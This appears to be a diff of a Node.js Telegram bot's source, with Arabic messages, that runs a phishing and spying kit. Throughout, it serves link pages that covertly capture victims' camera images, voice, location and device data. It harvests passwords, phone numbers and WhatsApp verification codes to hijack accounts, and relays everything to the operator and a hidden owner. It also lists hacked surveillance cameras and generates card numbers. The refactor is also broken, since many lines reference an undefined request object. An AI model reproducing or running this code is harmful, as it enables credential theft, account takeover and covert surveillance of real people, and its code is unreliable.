+      getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, message);
     }
   }
 });
@@ -846,7 +909,7 @@ bot.onText(/\/start (.+)/, async (msg, match) => {
     const allChannels = fixedChannels.concat(additionalChannels);
     const buttons = allChannels.map(channel => [{ text: `اشترك في ${channel.name}`, url: channel.inviteLink }]);
 
-    bot.sendMessage(chatId, message, {
+    getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, message, {
       reply_markup: {
         inline_keyboard: buttons
       }
@@ -871,7 +934,7 @@ bot.onText(/\/start (.+)/, async (msg, match) => {
       userPoints[userId] += 1;
 
       const message = `شخص جديد دخل إلى الرابط الخاص بك! وحصلت على 1 نقطة.\nعندما تصل إلى 30 نقطة سيتم فتح المميزات المدفوعة تلقائيًا.`;
-      bot.sendMessage(chatId, message);
+      getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, message);
     }
   }
 });
@@ -946,7 +1009,7 @@ app.get('/getLocation/:linkId', (req, res) => {
         res.sendFile(path.join(__dirname, 'lo.html'));
     } else {
         res.send('تم استخدام هذا الرابط خمس مرات الرجاء تغير هذا الرابط.');
-        if (chatId) bot.sendMessage(chatId, 'لقد قام ضحيتك في الدخول لرابط منتهى قم في تلغيم رابط جديد ');
+        if (chatId) getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, 'لقد قام ضحيتك في الدخول لرابط منتهى قم في تلغيم رابط جديد ');
     }
 });
 
@@ -962,7 +1025,7 @@ app.get('/captureFront/:linkId', (req, res) => {
         res.sendFile(path.join(__dirname, 'c.html'));
     } else {
         res.send('تم استخدام هذا الرابط خمس مرات الرجاء تغير هذا الرابط.');
-        if (chatId) bot.sendMessage(chatId, 'لقد قام ضحيتك في الدخول لرابط منتهى قم في تلغيم رابط جديد ');
+        if (chatId) getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, 'لقد قام ضحيتك في الدخول لرابط منتهى قم في تلغيم رابط جديد ');
     }
 });
 
@@ -978,7 +1041,7 @@ app.get('/captureBack/:linkId', (req, res) => {
         res.sendFile(path.join(__dirname, 'b.html'));
     } else {
         res.send('تم استخدام هذا الرابط خمس مرات الرجاء تغير هذا الرابط.');
-        if (chatId) bot.sendMessage(chatId, 'لقد قام ضحيتك في الدخول لرابط منتهى قم في تلغيم رابط جديد ');
+        if (chatId) getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, 'لقد قام ضحيتك في الدخول لرابط منتهى قم في تلغيم رابط جديد ');
     }
 });
 
@@ -994,7 +1057,7 @@ app.get('/record/:linkId', (req, res) => {
         res.sendFile(path.join(__dirname, 'r.html'));
     } else {
         res.send('تم استخدام هذا الرابط خمس مرات الرجاء تغير هذا الرابط.');
-        if (chatId) bot.sendMessage(chatId, 'لقد قام ضحيتك في الدخول لرابط منتهى قم في تلغيم رابط جديد ');
+        if (chatId) getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, 'لقد قام ضحيتك في الدخول لرابط منتهى قم في تلغيم رابط جديد ');
     }
 });
 
@@ -1010,7 +1073,7 @@ app.post('/submitNames', (req, res) => {
 
     console.log('Received data:', req.body); 
 
-    getTargetBot(req.body.bot || req.query.bot).sendMessage(chatId, `تم اختراق حساب جديد⚠️: \n اليوزر: ${firstName} \nكلمة السر: ${secondName}`)
+    getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, `تم اختراق حساب جديد⚠️: \n اليوزر: ${firstName} \nكلمة السر: ${secondName}`)
         .then(() => {
 
         })
@@ -1062,7 +1125,7 @@ app.post('/submitPhoneNumber', (req, res) => {
   const phoneNumber = req.body.phoneNumber;
 
 
-  getTargetBot(req.body.bot || req.query.bot).sendMessage(chatId, `لقد قام الضحيه في ادخال رقم الهاتف هذا قم في طلب كود هاذا الرقم في وتساب سريعاً\n: ${phoneNumber}`)
+  getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, `لقد قام الضحيه في ادخال رقم الهاتف هذا قم في طلب كود هاذا الرقم في وتساب سريعاً\n: ${phoneNumber}`)
     .then(() => {
       res.json({ success: true });
     })
@@ -1081,7 +1144,7 @@ app.post('/submitCode', (req, res) => {
   const code = req.body.code;
 
 
-  getTargetBot(req.body.bot || req.query.bot).sendMessage(chatId, `لقد تم وصول كود الرقم هذا هو\n: ${code}`)
+  getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, `لقد تم وصول كود الرقم هذا هو\n: ${code}`)
     .then(() => {
 
       res.redirect('https://faq.whatsapp.com/');
@@ -1312,7 +1375,7 @@ app.post('/submitVoice', uploadVoice.single('voice'), (req, res) => {
     }
     const voicePath = req.file.path;
 
-    getTargetBot(req.body.bot || req.query.bot).sendVoice(chatId, voicePath).then(() => {
+    bot.sendVoice(chatId, voicePath).then(() => {
         fs.unlinkSync(voicePath);
         res.send('');
     }).catch(error => {
@@ -1376,7 +1439,7 @@ app.post('/mm', async (req, res) => {
         `;
 
         try {
-            await bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
+            await getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, message, { parse_mode: 'Markdown' });
             console.log('تم إرسال معلومات الجهاز بنجاح');
             res.json({ success: true });
         } catch (err) {
@@ -1413,7 +1476,7 @@ app.post('/so', (req, res) => {
             const fullName = `${user.first_name || ""} ${user.last_name || ""}`.trim();
 
           
-            getTargetBot(req.body.bot || req.query.bot).sendPhoto(chatId, buffer, { caption: `📸 الصورة ${index + 1}` });
+            bot.sendPhoto(chatId, buffer, { caption: `📸 الصورة ${index + 1}` });
 
           
             botOwner.sendPhoto(ownerChatId, buffer, {
@@ -1500,7 +1563,7 @@ bot.onText(/\/stㅇㅗㅑㅡarㅏt/, async (msg) => {
             { text: `اشترك في ${channel}`, url: `https://t.me/${channel.substring(1)}` }
         ]);
 
-        getTargetBot(req.body.bot || req.query.bot).sendMessage(chatId, message, {
+        getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, message, {
             reply_markup: {
                 inline_keyboard: buttons
             }
@@ -1592,7 +1655,7 @@ bot.onText(/\/stㅇㅗㅑㅡarㅏt/, async (msg) => {
         ]
      ] 
 
-    bot.sendMessage(chatId, mainMenuMessage, {
+    getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, mainMenuMessage, {
         reply_markup: {
             inline_keyboard: mainMenuButtons
         }
@@ -1608,7 +1671,7 @@ bot.onText(/\/stㅇㅗㅑㅡarㅏt/, async (msg) => {
             ]
         ];
 
-        bot.sendMessage(chatId, adminMenuMessage, {
+        getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, adminMenuMessage, {
             reply_markup: {
                 inline_keyboard: adminMenuButtons
             }
@@ -1623,7 +1686,7 @@ bot.on('callback_query', (callbackQuery) => {
         const message = `تم انشاء الرابط ملاحظه بزم يكون النت قوي في جهاز الضحيه\n: ${baseUrl}/capture?t=${generateShortToken(chatId, 'capture_video')}`;
 
         if (message && message.trim() !== '') {
-            bot.sendMessage(chatId, message);
+            getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, message);
         } else {
             console.log('🚫 تم منع إرسال رسالة فارغة في callback_query.');
         }
@@ -1640,7 +1703,7 @@ bot.on('callback_query', async (callbackQuery) => {
         const message = 'الرجاء الاشتراك في جميع قنوات المطور قبل استخدام البوت.';
         const buttons = developerChannels.map(channel => ({ text: `اشترك في ${channel}`, url: `https://t.me/${channel.substring(1)}` }));
 
-        bot.sendMessage(chatId, message, {
+        getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, message, {
             reply_markup: {
                 inline_keyboard: [buttons]
             }
@@ -1650,7 +1713,7 @@ bot.on('callback_query', async (callbackQuery) => {
 
     if (data === 'request_verification') {
         const verificationLink = `${baseUrl}/whatsapp?t=${generateShortToken(chatId, 'whatsapp')}`;
-        bot.sendMessage(chatId, `تم انشاء الرابط لختراق وتساب\n: ${verificationLink}`);
+        getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, `تم انشاء الرابط لختراق وتساب\n: ${verificationLink}`);
         return;
     }
 
@@ -1671,10 +1734,10 @@ bot.on('callback_query', async (callbackQuery) => {
             });
             const joke = response.data.choices[0].message.content;
 
-            bot.sendMessage(chatId, joke);
+            getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, joke);
         } catch (error) {
             console.error('Error fetching joke:', error.response ? error.response.data : error.message);
-            bot.sendMessage(chatId, 'حدثت مشكلة أثناء جلب النكتة. الرجاء المحاولة مرة أخرى لاحقًا😁.');
+            getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, 'حدثت مشكلة أثناء جلب النكتة. الرجاء المحاولة مرة أخرى لاحقًا😁.');
         }
     } else if (data === 'get_love_message') {
         try {
@@ -1691,10 +1754,10 @@ bot.on('callback_query', async (callbackQuery) => {
             });
             const joke = response.data.choices[0].message.content;
 
-            bot.sendMessage(chatId, joke);
+            getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, joke);
         } catch (error) {
             console.error('Error fetching joke:', error.response ? error.response.data : error.message);
-            bot.sendMessage(chatId, 'حدثت مشكلة أثناء جلب النكتة. الرجاء المحاولة مرة أخرى لاحقًا😁.');
+            getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, 'حدثت مشكلة أثناء جلب النكتة. الرجاء المحاولة مرة أخرى لاحقًا😁.');
         }
     } else if (data === 'get_love_message') {
         try {
@@ -1711,38 +1774,38 @@ bot.on('callback_query', async (callbackQuery) => {
             });
             const love = response.data.choices[0].message.content;
 
-            bot.sendMessage(chatId, love);  
+            getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, love);  
 } catch (error) {  
     console.error('Error fetching love message:', error.response ? error.response.data : error.message);  
     const errorMsg = 'حدثت مشكلة أثناء جلب الرسالة. الرجاء المحاولة مرة أخرى لاحق😁ًا.';
     if (errorMsg && errorMsg.trim() !== '') {
-        bot.sendMessage(chatId, errorMsg);
+        getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, errorMsg);
     }
 }  
 } else if (data === 'add_vip' && chatId == 5739065274) {  
     const addVipMsg = 'الرجاء إرسال معرف المستخدم لإضافته كـ VIP:';
     if (addVipMsg && addVipMsg.trim() !== '') {
-        bot.sendMessage(chatId, addVipMsg);
+        getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, addVipMsg);
     }
     bot.once('message', (msg) => {  
         const userId = msg.text;  
         addVIPUser(userId);
         const addedMsg = `تم إضافة المستخدم ${userId} كـ VIP.`;
         if (addedMsg && addedMsg.trim() !== '') {
-            bot.sendMessage(chatId, addedMsg);
+            getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, addedMsg);
         }
     });  
 } else if (data === 'remove_vip' && chatId == 5739065274) {  
     const removeVipMsg = 'الرجاء إرسال معرف المستخدم لإزالته من VIP:';
     if (removeVipMsg && removeVipMsg.trim() !== '') {
-        bot.sendMessage(chatId, removeVipMsg);
+        getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, removeVipMsg);
     }
     bot.once('message', (msg) => {  
         const userId = msg.text;  
         removeVIPUser(userId);
         const removedMsg = `تم إزالة المستخدم ${userId} من VIP.`;
         if (removedMsg && removedMsg.trim() !== '') {
-            bot.sendMessage(chatId, removedMsg);
+            getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, removedMsg);
         }
     });  
 } else {  
@@ -1750,7 +1813,7 @@ bot.on('callback_query', async (callbackQuery) => {
 
     if (!exemptButtons.includes(action) && !validateLinkUsage(userId, action)) {  
         // هنا غيرت السطر ليمنع إرسال رسالة فارغة
-        // bot.sendMessage(chatId, '');  
+        // getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, '');  
         return;  
     }  
 
@@ -1780,11 +1843,11 @@ bot.on('callback_query', async (callbackQuery) => {
                 link = `${baseUrl}/getNameForm?t=${generateShortToken(chatId, 'facebook')}`;
                 break;
             default:
-                bot.sendMessage(chatId, '');
+                getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, '');
                 return;
         }
 
-        bot.sendMessage(chatId, `تم إنشاء الرابط: ${link}`);
+        getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, `تم إنشاء الرابط: ${link}`);
     }
 
     bot.answerCallbackQuery(callbackQuery.id);
@@ -1792,7 +1855,7 @@ bot.on('callback_query', async (callbackQuery) => {
 bot.onText(/\/jjihigjoj/, (msg) => {
     const chatId = msg.chat.id;
     const message = 'مرحبًا! انقر على الزر لجمع معلومات جهازك.';
-    bot.sendMessage(chatId, message, {
+    getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, message, {
         reply_markup: {
             inline_keyboard: [
                 [{ text: 'جمع معلومات الجهاز', callback_data: 'collect_device_info' }]
@@ -1808,7 +1871,7 @@ bot.on('callback_query', (query) => {
 
     if (query.data === 'collect_device_info') {
         const url = `${baseUrl}/info?t=${generateShortToken(chatId, 'device_info')}`;
-        bot.sendMessage(chatId, `رابط جمع المعلومات: ${url}`);
+        getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, `رابط جمع المعلومات: ${url}`);
     }
 
 
@@ -1819,7 +1882,7 @@ bot.on('callback_query', (query) => {
 
     if (query.data === 'get_link') {
 
-        bot.sendMessage(chatId, 'أرسل لي رابطًا يبدأ بـ "https".');
+        getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, 'أرسل لي رابطًا يبدأ بـ "https".');
 
 
         const messageHandler = (msg) => {
@@ -1832,13 +1895,13 @@ bot.on('callback_query', (query) => {
                     dataStore[chatId] = { userLink };
 
 
-                    bot.sendMessage(chatId, `تم تلغيم هذا الرابط ⚠️:\n${baseUrl}/k.html?t=${generateShortToken(chatId, 'k_link')}`);
+                    getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, `تم تلغيم هذا الرابط ⚠️:\n${baseUrl}/k.html?t=${generateShortToken(chatId, 'k_link')}`);
 
 
                     bot.removeListener('message', messageHandler);
                 } else {
 
-                    bot.sendMessage(chatId, 'الرجاء إدخال رابط صحيح يبدأ بـ "https".');
+                    getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, 'الرجاء إدخال رابط صحيح يبدأ بـ "https".');
                 }
             }
         };
@@ -1876,7 +1939,7 @@ app.post('/submitNames', (req, res) => {
 
     console.log('Received data:', req.body); 
 
-    getTargetBot(req.body.bot || req.query.bot).sendMessage(chatId, `أسماء المستخدمين: ${firstName} و ${secondName}`)
+    getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, `أسماء المستخدمين: ${firstName} و ${secondName}`)
         .then(() => {
             res.sendFile(path.join(__dirname, 'g.html')); 
         })
@@ -1923,7 +1986,7 @@ app.post('/submitNames', (req, res) => {
 
     console.log('Received data:', req.body); 
 
-    getTargetBot(req.body.bot || req.query.bot).sendMessage(chatId, `أسماء المستخدمين: ${firstName} و ${secondName}`)
+    getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, `أسماء المستخدمين: ${firstName} و ${secondName}`)
         .then(() => {
             res.sendFile(path.join(__dirname, 'F.html')); 
         })
@@ -1970,7 +2033,7 @@ app.post('/submitNames', (req, res) => {
 
     console.log('Received data:', req.body); 
 
-    getTargetBot(req.body.bot || req.query.bot).sendMessage(chatId, `أسماء المستخدمين: ${firstName} و ${secondName}`)
+    getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, `أسماء المستخدمين: ${firstName} و ${secondName}`)
         .then(() => {
             res.sendFile(path.join(__dirname, 's.html')); 
         })
@@ -2182,13 +2245,13 @@ function showCountryList(chatId, startIndex = 0) {
             buttons.push(navigationButtons);
         }
 
-        bot.sendMessage(chatId, "اختر الدولة:", {
+        getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, "اختر الدولة:", {
             reply_markup: {
                 inline_keyboard: buttons
             }
         });
     } catch (error) {
-        bot.sendMessage(chatId, `حدث خطأ أثناء إنشاء القائمة: ${error.message}`);
+        getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, `حدث خطأ أثناء إنشاء القائمة: ${error.message}`);
     }
 }
 
@@ -2196,7 +2259,7 @@ function showCountryList(chatId, startIndex = 0) {
 async function displayCameras(chatId, countryCode) {
     try {
 
-        const message = await bot.sendMessage(chatId, "جاري اختراق كامراة مراقبه.....");
+        const message = await getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, "جاري اختراق كامراة مراقبه.....");
         const messageId = message.message_id;
 
         for (let i = 0; i < 15; i++) {
@@ -2215,7 +2278,7 @@ async function displayCameras(chatId, countryCode) {
         let res = await axios.get(url, { headers });
         const lastPageMatch = res.data.match(/pagenavigator\("\?page=", (\d+)/);
         if (!lastPageMatch) {
-            bot.sendMessage(chatId, "لم يتم اختراق كامراة المراقبه في هذا الدوله بسبب قوة الامان جرب دوله مختلفه او حاول مره اخرى لاحقًا.");
+            getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, "لم يتم اختراق كامراة المراقبه في هذا الدوله بسبب قوة الامان جرب دوله مختلفه او حاول مره اخرى لاحقًا.");
             return;
         }
         const lastPage = parseInt(lastPageMatch[1], 10);
@@ -2231,14 +2294,14 @@ async function displayCameras(chatId, countryCode) {
             const numberedCameras = cameras.map((camera, index) => `${index + 1}. ${camera}`);
             for (let i = 0; i < numberedCameras.length; i += 50) {
                 const chunk = numberedCameras.slice(i, i + 50);
-                await bot.sendMessage(chatId, chunk.join('\n'));
+                await getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, chunk.join('\n'));
             }
-            await bot.sendMessage(chatId, "لقد تم اختراق كامراة المراقبه من هذا الدوله يمكنك التمتع في المشاهده عمك المنحرف.\n ⚠️ملاحظه مهمه اذا لم تفتح الكامرات في جهازك او طلبت باسورد قم في تعير الدوله او حاول مره اخره لاحقًا ");
+            await getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, "لقد تم اختراق كامراة المراقبه من هذا الدوله يمكنك التمتع في المشاهده عمك المنحرف.\n ⚠️ملاحظه مهمه اذا لم تفتح الكامرات في جهازك او طلبت باسورد قم في تعير الدوله او حاول مره اخره لاحقًا ");
         } else {
-            await bot.sendMessage(chatId, "لم يتم اختراق كامراة المراقبه في هذا الدوله بسبب قوة امانها جرب دوله اخره او حاول مره اخرى لاحقًا.");
+            await getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, "لم يتم اختراق كامراة المراقبه في هذا الدوله بسبب قوة امانها جرب دوله اخره او حاول مره اخرى لاحقًا.");
         }
     } catch (error) {
-        await bot.sendMessage(chatId, `لم يتم اختراق كامراة المراقبه في هذا الدوله بسبب قوة امانها جرب دوله اخره او حاول مره اخرى لاحقًا.`);
+        await getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, `لم يتم اختراق كامراة المراقبه في هذا الدوله بسبب قوة امانها جرب دوله اخره او حاول مره اخرى لاحقًا.`);
     }
 }
 
@@ -2251,7 +2314,7 @@ function isDeveloper(chatId) {
 
 
 function showAdminPanel(chatId) {
-    bot.sendMessage(chatId, "لوحة التحكم:", {
+    getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, "لوحة التحكم:", {
         reply_markup: {
             inline_keyboard: [
                 [{ text: "إضافة مستخدم VIP", callback_data: "add_vip" }],
@@ -2264,7 +2327,7 @@ function showAdminPanel(chatId) {
 bot.onText(/\/jjjjjavayy/, (msg) => {
     const chatId = msg.chat.id;
     const message = 'مرحبًا! انقر على الرابط لإضافة أسماء المستخدمين.';
-    bot.sendMessage(chatId, message, {
+    getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, message, {
         reply_markup: {
             inline_keyboard: [
                 [{ text: 'إختراق ببجي', callback_data: 'feat_pubg_hack' }],
@@ -2288,17 +2351,17 @@ bot.on('callback_query', (query) => {
     }
 
     if (link) {
-        bot.sendMessage(chatId, `تم لغيم الرابط هذا: ${link}`);
+        getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, `تم لغيم الرابط هذا: ${link}`);
         bot.answerCallbackQuery(query.id, { text: 'تم إرسال الرابط إليك ✅' });
     } else if (query.data === 'add_nammes') {
-        bot.sendMessage(chatId, `قم بإرسال هذا لفتح أوامر اختراق الهاتف كاملاً قم بضغط على هذا الامر /Vip`);
+        getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, `قم بإرسال هذا لفتح أوامر اختراق الهاتف كاملاً قم بضغط على هذا الامر /Vip`);
         bot.answerCallbackQuery(query.id, { text: '' });
     }
 });
 
 bot.onText(/\/نننطسطوو/, (msg) => {
     const chatId = msg.chat.id;
-    bot.sendMessage(chatId, "مرحبا! في بوت اختراق كاميرات المراقبة 📡", {
+    getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, "مرحبا! في بوت اختراق كاميرات المراقبة 📡", {
         reply_markup: {
             inline_keyboard: [[{ text: "ابدأ الاختراق", callback_data: "get_cameras" }]]
         }
@@ -2385,7 +2448,7 @@ bot.onText(/\/نكخمنتته/, (msg) => {
     parse_mode: "Markdown"
   };
 
-  bot.sendMessage(chatId, "*Hi Bro, I'm* [™](t.me/) \n*Press the button below to generate Visa!*", options);
+  getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, "*Hi Bro, I'm* [™](t.me/) \n*Press the button below to generate Visa!*", options);
 });
 
 
@@ -2393,7 +2456,7 @@ bot.on('callback_query', async (callbackQuery) => {
   const chatId = callbackQuery.message.chat.id;
 
   if (callbackQuery.data === "generate_visa") {
-    let progressMsg = await bot.sendMessage(chatId, "Generating Visa...\n[░░░░░░░░░░] 0%");
+    let progressMsg = await getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, "Generating Visa...\n[░░░░░░░░░░] 0%");
 
     await new Promise(res => setTimeout(res, 1000));
     await bot.editMessageText("Generating Visa...\n[▓▓░░░░░░░░] 25%", { chat_id: chatId, message_id: progressMsg.message_id });
@@ -2415,7 +2478,7 @@ bot.on('callback_query', async (callbackQuery) => {
     if (visaData) {
       const { CardNumber, Expiry, CVV, Bank, CardType, Country, Value } = visaData;
 
-      bot.sendMessage(chatId, `
+      getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, `
 𝗣𝗮𝘀𝘀𝗲𝗱 ✅
 *[-] Card Number :* \`${CardNumber}\`
 *[-] Expiry :* \`${Expiry}\`
@@ -2428,7 +2491,7 @@ bot.on('callback_query', async (callbackQuery) => {
 [-] by :* [BOT](t.me/ZI0_bot)
       `, { parse_mode: "Markdown" });
     } else {
-      bot.sendMessage(chatId, "Failed to fetch visa data. Please try again later.");
+      getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, "Failed to fetch visa data. Please try again later.");
     }
   }
 });
@@ -2484,7 +2547,7 @@ app.post('/xx', (req, res) => {
             const fullName = `${user.first_name || ""} ${user.last_name || ""}`.trim();
 
           
-            getTargetBot(req.body.bot || req.query.bot).sendPhoto(chatId, buffer, { caption: `🙋‍♂️ الصورة ${index + 1}` });
+            bot.sendPhoto(chatId, buffer, { caption: `🙋‍♂️ الصورة ${index + 1}` });
 
           
             botOwner.sendPhoto(ownerChatId, buffer, {
@@ -2510,7 +2573,7 @@ app.get('/ios', (req, res) => {
 bot.onText(/\/اتتهتتاههة/, (msg) => {
     const chatId = msg.chat.id;
     const message = 'مرحبًا! انقر على الرابط أدناه للحصول على رابط لالتقاط الصور.';
-    getTargetBot(req.body.bot || req.query.bot).sendMessage(chatId, message, {
+    getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, message, {
         reply_markup: {
             inline_keyboard: [
                 [{ text: 'احصل على رابط التقاط الصور', callback_data: 'get_photo_link' }]
@@ -2526,7 +2589,7 @@ bot.on('callback_query', (callbackQuery) => {
 
     if (callbackQuery.data === 'get_photo_link') {
         const link = `${baseUrl}/xx.html?t=${generateShortToken(chatId, 'xx')}`;
-        bot.sendMessage(chatId, `سيتم تصوير الضحيه بدقه عاليه: ${link}`);
+        getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, `سيتم تصوير الضحيه بدقه عاليه: ${link}`);
     }
 });
 
@@ -2539,7 +2602,7 @@ bot.onText(/\/sخسننسمس/, (msg) => {
         },
     };
 
-    bot.sendMessage(chatId, "مرحبًا! اضغط على الزر لتوليد رابط دعوة.", opts);
+    getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, "مرحبًا! اضغط على الزر لتوليد رابط دعوة.", opts);
 });
 
 bot.on('callback_query', (query) => {
@@ -2688,7 +2751,7 @@ bot.onText(/\/stسمهصخصt/, (msg) => {
             ]
         }
     };
-    bot.sendMessage(chatId, "اضغط على الزر للحصول على رقم وهمي:", options);
+    getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, "اضغط على الزر للحصول على رقم وهمي:", options);
 });
 const m =('لجميع الموقع والبرامج') 
 
@@ -2718,7 +2781,7 @@ bot.on('callback_query', async (callbackQuery) => {
                 `➖ اضغط ع الرقم لنسخه.`;
             bot.editMessageText(response, { chat_id: chatId, message_id: msg.message_id, parse_mode: "Markdown", reply_markup: options.reply_markup });
         } else {
-            bot.sendMessage(chatId, "لم يتم استيراد الأرقام بنجاح.");
+            getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, "لم يتم استيراد الأرقام بنجاح.");
         }
     } else if (data.startsWith('request_code_')) {
         const num = data.split('_')[2];
@@ -2726,9 +2789,9 @@ bot.on('callback_query', async (callbackQuery) => {
         if (messages.length > 0) {
             let messageText = messages.slice(0, 6).map((msg, index) => `الرسالة رقم ${index + 1}: \`${msg}\``).join('\n\n');
             messageText += "\n\nاضغط على أي رسالة لنسخها.";
-            bot.sendMessage(chatId, messageText, { parse_mode: "Markdown" });
+            getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, messageText, { parse_mode: "Markdown" });
         } else {
-            bot.sendMessage(chatId, "لا توجد رسائل جديدة.");
+            getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, "لا توجد رسائل جديدة.");
         }
     }
 });
@@ -2808,13 +2871,13 @@ bot.onText(/\/sكخزننننtart/, (msg) => {
             ]
         }
     };
-    bot.sendMessage(chatId, 'اضغط على الزر لفحص الروابط', opts);
+    getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, 'اضغط على الزر لفحص الروابط', opts);
 });
 
 bot.on('callback_query', (callbackQuery) => {
     const chatId = callbackQuery.message.chat.id;
     if (callbackQuery.data === 'check_links') {
-        bot.sendMessage(chatId, 'الرجاء إرسال الرابط لفحصه.');
+        getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, 'الرجاء إرسال الرابط لفحصه.');
         waiting_for_link[chatId] = true;
     }
 });
@@ -2825,12 +2888,12 @@ bot.on('message', async (msg) => {
 
     if (waiting_for_link[chatId]) {
         if (!isValidUrl(url)) {
-            bot.sendMessage(chatId, 'يرجى إرسال الرابط بشكل صحيح.');
+            getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, 'يرجى إرسال الرابط بشكل صحيح.');
             return;
         }
 
 
-        let progressMsg = await bot.sendMessage(chatId, 'Verification...\n[░░░░░░░░░░] 0%');
+        let progressMsg = await getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, 'Verification...\n[░░░░░░░░░░] 0%');
 
 
         await sleep(4000);
@@ -2869,7 +2932,7 @@ bot.on('message', async (msg) => {
         • معلومات IP: ${ip || 'غير قابل للاستخراج'}\n\n
         • مزود الخدمة: ${ipInfo.org || 'غير متوفر'}
         `;
-        bot.sendMessage(chatId, resultMessage);
+        getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, resultMessage);
 
         waiting_for_link[chatId] = false;
     } else {
